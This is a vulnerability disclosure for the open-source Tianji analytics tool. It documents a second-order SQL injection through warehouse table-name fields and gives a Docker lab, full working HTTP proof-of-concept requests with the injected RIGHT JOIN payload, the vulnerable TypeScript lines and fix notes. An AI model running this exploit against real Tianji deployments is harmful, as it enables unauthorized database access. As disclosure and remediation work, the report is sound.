### Vulnerability details

**Official website / Product:** https://tianji.dev / https://github.com/msgbyte/tianji

**Repository:** msgbyte/tianji (stars at selection: 3120)

**Vulnerability type:** SQL Injection (second-order / identifier concatenation)

**Vulnerability versions:** 1.33.13 (Docker image `moonrailgun/tianji:latest`; audited commit `2feecfc1dae83b5522978e0f87418eb2c32b927e`). The same pattern also affects `insightsLongTableWarehouseFilterParams`.

**Vulnerability URL / Parameter:**
- Poison: `POST /trpc/workspace.config.setConfig` (`key=warehouse`, `value.applications[].eventTable.name` and related fields)
- Trigger: `GET /trpc/insights.eventNames` (`insightType=warehouse`)

**Complex:** yes

### Verification procedure

1. Rebuild the lab (original `labs/tianji-r18a1` was removed by hygiene policy; the compose below matches verification). Write `docker-compose.yml` and `mysql-init/01-warehouse.sql` in any directory, then start:

```yaml
# docker-compose.yml
services:
  tianji:
    image: moonrailgun/tianji:latest
    ports:
      - "19801:12345"
    environment:
      DATABASE_URL: postgresql://tianji:tianji@postgres:5432/tianji
      JWT_SECRET: r18a1-lab-jwt-secret
      ALLOW_REGISTER: "true"
      ALLOW_OPENAPI: "true"
      PUBLIC_URL: "http://127.0.0.1:19801"
    depends_on:
      postgres:
        condition: service_healthy
      mysql:
        condition: service_started
    restart: unless-stopped

  postgres:
    image: postgres:15.4-alpine
    environment:
      POSTGRES_DB: tianji
      POSTGRES_USER: tianji
      POSTGRES_PASSWORD: tianji
    volumes:
      - tianji-pg-data:/var/lib/postgresql/data
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U $${POSTGRES_USER} -d $${POSTGRES_DB}"]
      interval: 5s
      timeout: 5s
      retries: 5
    restart: unless-stopped

  mysql:
    image: mysql:8.0
    ports:
      - "19811:3306"
    environment:
      MYSQL_ROOT_PASSWORD: rootpass
      MYSQL_DATABASE: warehouse
      MYSQL_USER: wh
      MYSQL_PASSWORD: whpass
    volumes:
      - ./mysql-init:/docker-entrypoint-initdb.d:ro
      - tianji-mysql-data:/var/lib/mysql
    restart: unless-stopped

volumes:
  tianji-pg-data:
  tianji-mysql-data:
```

```sql
-- mysql-init/01-warehouse.sql
CREATE TABLE IF NOT EXISTS events (
  event_name VARCHAR(255),
  session_id VARCHAR(255),
  created_at BIGINT
);
CREATE TABLE IF NOT EXISTS event_params (
  event_name VARCHAR(255),
  param_name VARCHAR(255),
  param_value VARCHAR(255),
  created_at BIGINT
);
INSERT INTO events (event_name, session_id, created_at) VALUES ('page_view', 's1', 1);
```

```bash
docker compose up -d
# wait healthy: 0.0.0.0:19801->12345/tcp ; MySQL warehouse helper: 0.0.0.0:19811->3306/tcp
# in-compose warehouse DSN: mysql://wh:whpass@mysql:3306/warehouse
```

2. Register and login as a workspace owner (`ALLOW_REGISTER=true`). Lab account: `r18a1` / `r18a1pass123`. `POST /open/register` if needed, then `POST /open/login` for the JWT and `currentWorkspaceId` (token / workspaceId in the captured requests below must be replaced with values from a fresh login after rebuild).
3. Call `workspace.config.setConfig` with a warehouse JSON whose `eventTable.name` breaks out of MySQL backticks (poison request below). Server accepts `z.any()` with **no** identifier allowlist.
4. Any workspace member calls `insights.eventNames` (`insightType=warehouse`, `insightId=demo`). The server interpolates the stored fields into backtick-quoted SQL; the injected `JOIN (SELECT CONCAT(user(),...) )` runs and the JSON body returns `wh@...|warehouse|8.0.46`.

### Complete vulnerability PoC

#### 0. Login (obtain Bearer JWT and workspaceId)

Complete HTTP request (Docker-verified):

```http
POST /open/login HTTP/1.1
Host: 127.0.0.1:19801
Accept: */*
Connection: close
Content-Type: application/json
Content-Length: 49

{"username": "r18a1", "password": "r18a1pass123"}
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Content-Type: application/json
Vary: Accept-Encoding
Date: Sun, 01 Nov 2026 18:34:10 GMT
Connection: close
Transfer-Encoding: chunked

{"info":{"id":"cmvy5vjuc0002px9gyw2uljur","role":"user","username":"r18a1","nickname":null,"avatar":null,"email":null,"createdAt":"2026-11-01T18:26:22.584Z","updatedAt":"2026-11-01T18:26:22.584Z","deletedAt":null,"currentWorkspaceId":"cmvy5vjsp0001px9ghobj3tea","workspaces":[{"role":"owner","workspace":{"id":"cmvy5vjsp0001px9ghobj3tea","name":"r18a1's Personal Workspace","settings":{},"paused":false}}]},"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImNtdnk1dmp1YzAwMDJweDlneXcydWxqdXIiLCJ1c2VybmFtZSI6InIxOGExIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3OTM1NTgwNTAsImV4cCI6MTc5NjE1MDA1MCwiYXVkIjoibXNnYnl0ZS5jb20iLCJpc3MiOiJ0aWFuamkubXNnYnl0ZS5jb20ifQ.8vrcpzHI6SlY-k5rfx9c2dbbw7gMRiPEjwEbvLLnMnU"}
```

#### A. Poison request (store malicious warehouse config)

Complete HTTP request (Docker-verified):

```http
POST /trpc/workspace.config.setConfig HTTP/1.1
Host: 127.0.0.1:19801
Accept: */*
Connection: close
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImNtdnk1dmp1YzAwMDJweDlneXcydWxqdXIiLCJ1c2VybmFtZSI6InIxOGExIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3OTM1NTgwNTAsImV4cCI6MTc5NjE1MDA1MCwiYXVkIjoibXNnYnl0ZS5jb20iLCJpc3MiOiJ0aWFuamkubXNnYnl0ZS5jb20ifQ.8vrcpzHI6SlY-k5rfx9c2dbbw7gMRiPEjwEbvLLnMnU
Content-Type: application/json
Content-Length: 700

{"workspaceId": "cmvy5vjsp0001px9ghobj3tea", "key": "warehouse", "value": {"enabled": true, "defaultDatabaseUrl": "mysql://wh:whpass@mysql:3306/warehouse", "applications": [{"name": "demo", "type": "longTable", "eventTable": {"name": "events` AS e RIGHT JOIN (SELECT CONCAT(user(),0x7c,database(),0x7c,@@version) AS v, 1 AS cdate) AS x ON 1=1 WHERE 1=1 -- ", "eventNameField": "v", "sessionIdField": "session_id", "createdAtField": "cdate", "createdAtFieldType": "timestampMs"}, "eventParametersTable": {"name": "event_params", "eventNameField": "event_name", "paramsNameField": "param_name", "paramsValueField": "param_value", "createdAtField": "created_at", "createdAtFieldType": "timestampMs"}}]}}
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
content-type: application/json
Vary: trpc-accept, Accept-Encoding
Date: Sun, 01 Nov 2026 18:34:10 GMT
Connection: close
Transfer-Encoding: chunked

{"result":{"data":{"id":"cmvy5zxks0009c47ry554jyk9","workspaceId":"cmvy5vjsp0001px9ghobj3tea","key":"warehouse","value":{"enabled":true,"defaultDatabaseUrl":"mysql://wh:whpass@mysql:3306/warehouse","applications":[{"name":"demo","type":"longTable","eventTable":{"name":"events` AS e RIGHT JOIN (SELECT CONCAT(user(),0x7c,database(),0x7c,@@version) AS v, 1 AS cdate) AS x ON 1=1 WHERE 1=1 -- ","eventNameField":"v","sessionIdField":"session_id","createdAtField":"cdate","createdAtFieldType":"timestampMs"},"eventParametersTable":{"name":"event_params","eventNameField":"event_name","paramsNameField":"param_name","paramsValueField":"param_value","createdAtField":"created_at","createdAtFieldType":"timestampMs"}}]},"createdAt":"2026-11-01T18:29:47.068Z","updatedAt":"2026-11-01T18:34:10.878Z"}}}
```

#### B. Trigger request (execute injection and return data)

Complete HTTP request (Docker-verified):

```http
GET /trpc/insights.eventNames?input=%7B%22workspaceId%22%3A%20%22cmvy5vjsp0001px9ghobj3tea%22%2C%20%22insightId%22%3A%20%22demo%22%2C%20%22insightType%22%3A%20%22warehouse%22%7D HTTP/1.1
Host: 127.0.0.1:19801
Accept: */*
Connection: close
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImNtdnk1dmp1YzAwMDJweDlneXcydWxqdXIiLCJ1c2VybmFtZSI6InIxOGExIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3OTM1NTgwNTAsImV4cCI6MTc5NjE1MDA1MCwiYXVkIjoibXNnYnl0ZS5jb20iLCJpc3MiOiJ0aWFuamkubXNnYnl0ZS5jb20ifQ.8vrcpzHI6SlY-k5rfx9c2dbbw7gMRiPEjwEbvLLnMnU
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
content-type: application/json
Vary: trpc-accept, Accept-Encoding
Date: Sun, 01 Nov 2026 18:34:10 GMT
Connection: close
Transfer-Encoding: chunked

{"result":{"data":[{"name":"wh@172.22.0.4|warehouse|8.0.46","count":0}]}}
```

Verification result notes:

Trigger response `result.data[0].name` equals `wh@172.22.0.4|warehouse|8.0.46`, i.e. `CONCAT(user(),0x7c,database(),0x7c,@@version)` executed via SQLi against the warehouse MySQL connection used by Tianji (impact bounded by that DB account). The sibling helper `insightsLongTableWarehouseFilterParams` (~549–555) concatenates `eventParametersTable.*` the same way and is exploitable analogously.

Lab account (at verify time): `r18a1` / `r18a1pass123` (workspace owner); warehouse DSN `mysql://wh:whpass@mysql:3306/warehouse`. Full login / poison / trigger HTTP transcript and impact echo are in the PoC fences above (trigger response `result.data[0].name` = `wh@172.22.0.4|warehouse|8.0.46`).

### Vulnerability analysis

Warehouse “long table” apps treat admin-configured table/column names as SQL identifiers. `insightsLongTableWarehouseEvents` embeds `eventTable.name` / `eventNameField` / `createdAtField` into MySQL backtick-quoted SQL via JavaScript template literals. Supplying a value such as `events` + backtick + ` AS e RIGHT JOIN (SELECT ...) AS x ... -- ` closes the identifier early and injects arbitrary SQL.

`quoteWarehouseIdentifier()` rejects `` `"? `` on some query-builder paths, but the event-name / filter-params listing paths bypass it entirely with raw string concatenation. `workspace.config.setConfig` takes `z.any()`; client `validateWarehouseConfig` only applies `z.string()` and does **not** ban backticks. After the config is stored, any caller of `insights.eventNames` (`workspaceProcedure`) can trigger the sink.

### Trigger / sink source (full path and line numbers)

```typescript
# File: src/server/model/insights/warehouse/longTable.ts
# Lines: 508-515
  const [rows] = await connection.pool.query(`
SELECT DISTINCT event_name
FROM (
    SELECT \`${eventTable.eventNameField}\` as event_name, \`${eventTable.dateBasedCreatedAtField ?? eventTable.createdAtField}\` as date
    FROM \`${eventTable.name}\`
    ORDER BY \`${eventTable.dateBasedCreatedAtField ?? eventTable.createdAtField}\` DESC
) t
LIMIT 100;`);
```

Sibling sink (filter param names):

```typescript
# File: src/server/model/insights/warehouse/longTable.ts
# Lines: 549-555
  const [rows] = await connection.pool.query(`
SELECT DISTINCT param_value
FROM (
    SELECT \`${eventParametersTable.paramsNameField}\` as param_value, \`${eventParametersTable.dateBasedCreatedAtField ?? eventParametersTable.createdAtField}\` as date
    FROM \`${eventParametersTable.name}\`
    ORDER BY \`${eventParametersTable.dateBasedCreatedAtField ?? eventParametersTable.createdAtField}\` DESC
) t
LIMIT 100;`);
```

### Fix notes

1. Validate every table/column name used in SQL with a strict identifier regex (e.g. `^[A-Za-z_][A-Za-z0-9_]*$`) or a hardened `quoteWarehouseIdentifier` / `assertQuotedSqlIdentifierPath`; reject backticks, comments, whitespace, and operators.
2. Do not build identifiers with string templates; use parameterized queries plus allowlisted identifier quoting only.
3. When `key==="warehouse"`, parse `setConfig` with `warehouseConfigSchema` server-side and apply the identifier regex to application fields.
4. Add regression tests that reject `` ` `` / `--` / `JOIN` / `UNION` in `eventTable.name`.

